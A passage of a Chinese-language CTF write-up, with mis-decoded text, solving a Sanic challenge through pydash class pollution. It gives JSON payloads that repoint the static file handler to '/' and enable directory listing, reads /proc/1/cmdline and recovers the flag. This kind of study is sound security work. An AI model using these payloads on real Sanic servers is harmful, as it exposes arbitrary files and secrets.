class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># ç”Ÿæˆæ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># å¤‡ä»½æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;ï¼ï¼ï¼æ­¤åœ°ç¦æ­¢èƒ¡æ¥ï¼Œä½ çš„éæ³•æ“ä½œå·²ç»è¢«è®°å½•ï¼ï¼ï¼&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>è¿™æ˜¯ä¸€ä¸ªå¤„ç† <code>/pollute</code> è·¯å¾„çš„å¼‚æ­¥å‡½æ•° <code>POLLUTE</code>ï¼Œæ”¯æŒ <code>GET</code> å’Œ <code>POST</code> æ–¹æ³•ã€‚</li><li>è§£æè¯·æ±‚çš„ JSON æ•°æ®ï¼Œè·å– <code>key</code> å’Œ <code>value</code>ã€‚</li><li>å¦‚æœæ¡ä»¶æ»¡è¶³ï¼š<ul><li>åˆ›å»ºä¸€ä¸ª <code>Pollute</code> å®ä¾‹ã€‚</li><li>ä½¿ç”¨ <code>pydash.set_</code> å‡½æ•° è®¾ç½® <code>pollute</code> å®ä¾‹çš„å±æ€§ã€‚</li><li>è¿”å› â€œsuccessâ€ æ–‡æœ¬ã€‚</li></ul></li><li>è¿™ä¸ªè·¯ç”±è¿˜è®¾ç½®äº†ä¸€ä¸ªwafï¼Œå¦‚æœè§¦å‘äº†wafï¼Œå°±ä¼šå°†keyå’Œvalueçš„å€¼å†™å…¥&#x2F;tmpç›®å½•ä¸‹çš„æ–‡ä»¶ä¸­</li></ul><p>payload:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µjsonä»£ç å°±æ˜¯å°†file_or_directoryè®¾ç½®ä¸ºâ€&#x2F;â€œæˆ‘çš„åŸºç¡€è¿˜æ˜¯å¾ˆè–„å¼±æ‰€ä»¥æˆ‘ä»¬åˆ†æè¿™ä¸ªpayload</p><ol><li><p><strong><code>__class__</code></strong>: è®¿é—®å½“å‰å¯¹è±¡çš„ç±»ã€‚</p></li><li><p><strong><code>__init__</code></strong>: è®¿é—®ç±»çš„æ„é€ å‡½æ•°ã€‚</p></li><li><p><strong><code>__globals__</code></strong>: è®¿é—®æ„é€ å‡½æ•°çš„å…¨å±€å‘½åç©ºé—´ï¼Œè¿™å…è®¸æ”»å‡»è€…è®¿é—®åº”ç”¨çš„å…¨å±€å˜é‡ã€‚</p></li><li><p><strong><code>app.router.name_index.__mp_main__</code></strong>: è¯•å›¾è®¿é—®Sanicåº”ç”¨çš„è·¯ç”±å™¨ä¸­çš„<code>name_index</code>ï¼Œå…¶ä¸­<code>__mp_main__</code>è¡¨ç¤ºæ¨¡å—çš„åç§°ã€‚</p></li><li><p><strong><code>.static.handler.keywords.file_or_directory</code></strong>: æœ€ç»ˆç›®æ ‡æ˜¯è®¿é—®å¹¶ä¿®æ”¹é™æ€æ–‡ä»¶å¤„ç†å™¨çš„<code>file_or_directory</code>å±æ€§ã€‚</p></li><li><p><code>&quot;/&quot;</code>: è®¾ç½®çš„å€¼ä¸ºæ ¹ç›®å½•ã€‚ï¼ˆè¡¥å……  ï¼š</p><p><code>file_or_directory</code> è¿™ä¸ªå±æ€§çš„ä½œç”¨é€šå¸¸æ˜¯ç”¨äºæŒ‡ç¤ºæ–‡ä»¶å¤„ç†å™¨å¤„ç†çš„æ˜¯æ–‡ä»¶è¿˜æ˜¯ç›®å½•ã€‚æ”»å‡»è€…è¯•å›¾é€šè¿‡ä¿®æ”¹ <code>file_or_directory</code> å±æ€§ï¼Œå°†å…¶å€¼è®¾ç½®ä¸º <code>&quot;/&quot;</code>ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å°†æ ¹ç›®å½•ä½œä¸ºé™æ€æ–‡ä»¶ç›®å½•ï¼Œä»è€Œæš´éœ²æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶å’Œç›®å½•ã€‚è¿™ç§æ”»å‡»åˆ©ç”¨äº†å¯¹å…³é”®å±æ€§ç¼ºä¹é€‚å½“éªŒè¯å’Œä¿æŠ¤çš„æ¼æ´ã€‚<br>ï¼‰å°±å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p></li></ol><p><img src="/imgs/8.png"></p><p>å›æ˜¾successï¼Œè¡¨é¢æˆåŠŸäº†</p><p>æ¥ç€æˆ‘ä»¬è®¿é—®&#x2F;static&#x2F;proc&#x2F;1&#x2F;cmdline</p><p>inuxç³»ç»Ÿä¸­çš„<code>/proc</code>æ–‡ä»¶ç³»ç»Ÿçš„è·¯å¾„ï¼Œå¹¶é€šè¿‡åº”ç”¨çš„é™æ€æ–‡ä»¶æœåŠ¡æš´éœ²å‡ºæ¥</p><ul><li>**<code>/proc/1/cmdline</code>**ï¼šè¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒ…å«å¯åŠ¨è¿›ç¨‹IDä¸º1çš„è¿›ç¨‹æ—¶ä½¿ç”¨çš„å‘½ä»¤è¡Œå‚æ•°ã€‚</li></ul><p><img src="/imgs/9.png"></p><p>æ˜¾ç¤ºå½“å‰çš„å¯åŠ¨è·¯å¾„ä¸º&#x2F;bin&#x2F;bash&#x2F;start.sh</p><p>æˆ‘ä»¬ç»§ç»­æ‰“å¼€è¿™ä¸ªè·¯å¾„</p><p><img src="/imgs/10.png"></p><p>å‘ç°è¿è¡Œçš„pyè„šæœ¬</p><p><img src="/imgs/11.png"></p><p>ç»™äº†ä¸¢å¤±çš„æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æºç å¥½åƒè¢«adminåˆ æ‰äº†ä¸€äº›ï¼Œå¬ä»–è¯´é‡Œé¢è—æœ‰å¤§ç§˜å¯†</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_log_dir</span>(<span class="params">n</span>):</span><br><span class="line">        ret = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">            letter = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">            Letter = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">            s = <span class="built_in">str</span>(random.choice([num, letter, Letter]))</span><br><span class="line">            ret += s</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">        </span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment">#æ–¹ä¾¿ç®¡ç†å‘˜æŸ¥çœ‹éæ³•æ—¥å¿—</span></span><br><span class="line">    log_dir=os.popen(<span class="string">&#x27;ls /tmp -al&#x27;</span>).read();</span><br><span class="line">    <span class="keyword">return</span> text(log_dir)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment">#ç”Ÿæˆæ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="comment">#å¤‡ä»½æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;ï¼ï¼ï¼æ­¤åœ°ç¦æ­¢èƒ¡æ¥ï¼Œä½ çš„éæ³•æ“ä½œå·²ç»è¢«è®°å½•ï¼ï¼ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br></pre></td></tr></table></figure><p>ä»–è¿™ä¸ªç»™äº†secretçš„è·¯å¾„</p><p>è®¿é—®çœ‹çœ‹</p><p><img src="/imgs/12.png"></p><p>ä»–è¯´flagåœ¨appè·¯ç”±ä¸‹ï¼Œä½†æ˜¯ä¸çŸ¥é“ä»–çš„åå­— è®©æˆ‘ä»¬æ‰¾</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br></pre></td></tr></table></figure><p>è¿˜ç»™äº†&#x2F;adminLookçš„è·¯ç”±</p><p><img src="/imgs/13.png"></p><p>æˆ‘ä»¬ä¼ å…¥æ¶æ„çš„key æ¯”å¦‚part è¿™ä¸€æ­¥å¾ˆé‡è¦åˆ°åé¢æ¥è§£é‡Š</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ä¼ å…¥åæˆ‘ä»¬å‘ç°å¤šäº†ä¸¤ä¸ªæ–‡ä»¶</p><p><img src="/imgs/14.png"></p><p>æœ‰ç‚¹ä¸ä¸€æ ·æ˜¯å› ä¸ºé¶æœºè¿‡æœŸäº†é‡æ–°æ‰“å¼€äº†</p><p>æˆ‘ä»¬å…ˆåˆ‡æ¢åˆ°&#x2F;tmpç›®å½•</p><p><img src="/imgs/15.png"></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>#å¯¹baseå±æ€§è¿›è¡Œæ±¡æŸ“</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/4KDN4B&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#æ‰“å¼€ç›®å½•åŠŸèƒ½</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®static&#x2F;4KDN4B..&#x2F;</p><p><img src="/imgs/16.png" alt="image-20240723165717529"></p><p>æœ€åå¾—åˆ°flagçš„åå­—ç›´æ¥è®¿é—®å°±å¥½</p><p>åœ¨æŠŠé™æ€æ–‡ä»¶ç›®å½•æ¢æˆä¸ºæ ¹ç›®å½•</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ä¹‹å‰çŸ¥é“flagåœ¨appè·¯ç”±ä¸‹</p><p>&#x2F;static&#x2F;app&#x2F;45W698WqtsgQT1_flag</p><p><img src="/imgs/17.png"></p><p>æ¥ä¸‹æ¥è§£é‡Šä¸Šé¢é—ç•™çš„é—®é¢˜</p><p>é‚£ä¹ˆä¸ºä»€ä¹ˆè¦æ¶æ„æ“ä½œè¢«åå°æ—¥å¿—è®°å½•å‘¢ï¼Ÿ</p><p>è¿™é‡Œå¤ç°å®Œäº†æˆ‘å…ˆæŠŠå¤§ä½¬çš„wpé“¾æ¥æ”¾å‡ºæ¥ï¼Œå› ä¸ºæˆ‘æ°´å¹³æœ‰é™ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ç…§ç€å¤§ä½¬wpæ¥è¿›è¡Œå¤ç°</p><p>æœ‰ç‚¹ä¸ºäº†å¤ç°è€Œå¤ç°çš„ä¸‘é™‹æ„Ÿï¼Œåˆ°åé¢æˆ‘ä¼šæ…¢æ…¢è¡¥å¥½åŸºç¡€çš„â”­â”®ï¹â”­â”®</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18290489">https://www.cnblogs.com/gxngxngxn/p/18290489</a></p><p><a href="https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98">https://dawnrisingdong.github.io/2024/07/22/DASCTF-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-Sanic-s-revenge%E5%A4%8D%E7%8E%B0/#%E8%A7%A3%E9%A2%98</a></p><p><a href="https://blog.csdn.net/2301_79700060/article/details/140632405">https://blog.csdn.net/2301_79700060/article/details/140632405</a></p><p><a href="https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_66013948/article/details/140582003?spm=1001.2014.3001.5502</a></p><p>é‚£ä¹ˆæˆ‘ä»¬ä»</p><p>[<strong>gxngxngxn]</strong></p><p>å¤§ä½¬çš„æ–‡ç« æ¥è§£é‡Šä¸‹</p><p>è¿™å¥—é¢˜ç›®å…¶å®æ˜¯ciscn2024 æ”¹çš„ä¸€é“é¢˜ç›®ï¼Œå…ˆæ”¾é“¾æ¥</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p><p>å›½èµ› sanicçš„æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>&#x2F;admin è·¯ç”±é‚£å—å°±æ˜¯ç¼–ç æˆå…«è¿›åˆ¶å¯ä»¥è¿›å…¥&#x2F;login,è€Œä¸”éœ€è¦ç»•è¿‡wafå¤§ä½¬æ–‡ç« éƒ½è®²äº†</p><p>ç›´æ¥çœ‹sanicé‚£å—æ±¡æŸ“é“¾å¯»æ‰¾</p><p>æˆ‘ä»¬å¯ä»¥æ±¡æŸ“__file__ç„¶åè¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“flagçš„ä½ç½®æ‰€ä»¥å¯ä»¥å¼€å¯ç›®å½•åŠŸèƒ½ï¼Œæœ‰å…³çš„ä¸¤ä¸ªå‡½æ•°</p><p><strong>directory_view</strong> <strong>directory_handler</strong></p><p>åªè¦æˆ‘ä»¬å°†directoryæ±¡æŸ“ä¸ºæ ¹ç›®å½•ï¼Œdirectory_viewæ±¡æŸ“ä¸ºTrueï¼Œå°±å¯ä»¥çœ‹åˆ°æ ¹ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶äº†</p><p>è¿™ä¸ªæ¡†æ¶å¯ä»¥é€šè¿‡**app.router.name_index[â€˜xxxxxâ€™]**æ¥è·å–æ³¨å†Œçš„è·¯ç”±</p><p>è·å¾—è¿™ä¸ªè·¯ç”±ä¹‹åæˆ‘ä»¬éœ€è¦è°ƒç”¨åˆ°DirectoryHandleré‡Œ</p><p>æˆ‘ä»¬å¯ä»¥ç”¨<strong>name_index</strong>æ–¹æ³•å‘ç°å¯ä»¥ä»handlerå…¥æ‰‹ï¼Œä¸€ç›´å¯ä»¥è·å–åˆ°DirectoryHandlerä¸­çš„directoryå’Œdirectory_view</p><p>ä»è€Œå®ç°æ±¡æŸ“è¾¾åˆ°åˆ—ç›®å½•çš„ç›®çš„</p><p>ç„¶åæ¥ä¸‹é‡Œå°±æ˜¯æ±¡æŸ“directory</p><p>ä½†æ˜¯directoryæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œå®ƒä¹‹å‰çš„å€¼å°±æ˜¯ç”±å…¶ä¸­çš„<strong>parts</strong>å±æ€§å†³å®šçš„ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªå±æ€§æ˜¯ä¸€ä¸ªtupleï¼Œä¸èƒ½ç›´æ¥è¢«æ±¡æŸ“ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°è¿™ä¸ªå±æ€§æ˜¯å¦‚ä½•è¢«èµ‹å€¼çš„?ï¼ˆè¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“tuple(å…ƒç»„ï¼šå…ƒç»„æ˜¯ Python ä¸­çš„ä¸€ç§æ•°æ®ç»“æ„ï¼Œç”¨äºå­˜å‚¨å¤šä¸ªå…ƒç´ ã€‚ä¸åˆ—è¡¨ç±»ä¼¼ï¼Œå…ƒç»„ä¹Ÿæ˜¯ä¸€ä¸ªåºåˆ—ï¼Œä½†ä¸åˆ—è¡¨ä¸åŒçš„æ˜¯ï¼Œå…ƒç»„æ˜¯ä¸å¯å˜çš„ã€‚è¿™æ„å‘³ç€å…ƒç»„ä¸€æ—¦åˆ›å»ºï¼Œå…¶å†…å®¹ä¸èƒ½ä¿®æ”¹)ï¼‰</p><p>æ‰€ä»¥ä¸èƒ½ç›´æ¥æ±¡æŸ“directory </p><p>ä½†åœ¨DirectoryHandlerç±»ä¸­æœ‰Directoryå±æ€§å¯ä»¥ä»è¿™å…¥æ‰‹è¿›å…¥pathå¯¹è±¡partsçš„å€¼æœ€åæ˜¯ç»™äº†_partsè¿™ä¸ªå±æ€§å‘ç°æ˜¯list</p><p>æœ€ç»ˆæ±¡æŸ“æˆ&#x2F;å°±æˆåŠŸäº†</p><p>åˆ°æ—¶å€™è¦å»å¤ç°ä¸‹å›½èµ›ciscnæ¯•ç«Ÿé‚£å¤©åäº†ä¸€å¤©ç‰¢</p><p>åˆ°è¿™è¿˜æ²¡å®Œè¿˜æ²¡</p><p>æˆ‘ä»¬ç»§ç»­çœ‹DirectoryHandlerç±»ä¸­handleæ–¹æ³•ä¸­çš„é€»è¾‘:</p><p>å½“æˆ‘ä»¬å¼€å¯åˆ—ç›®å½•åŠŸèƒ½åï¼Œå°±ä¼šè¿›å…¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">self</span>._index(    <span class="variable language_">self</span>.directory / current, path, request.app.debug )</span><br></pre></td></tr></table></figure><p>è§£å†³ä¸Šé¢é—ç•™çš„é—®é¢˜å°±æ˜¯ä»è¿™å¼€å§‹å‘ç°è¿™ä¸ªç›®å½•è·¯å¾„æ˜¯ç”±Parts+currentæ‹¼æ¥å‡ºæ¥çš„</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">self</span>.directory / 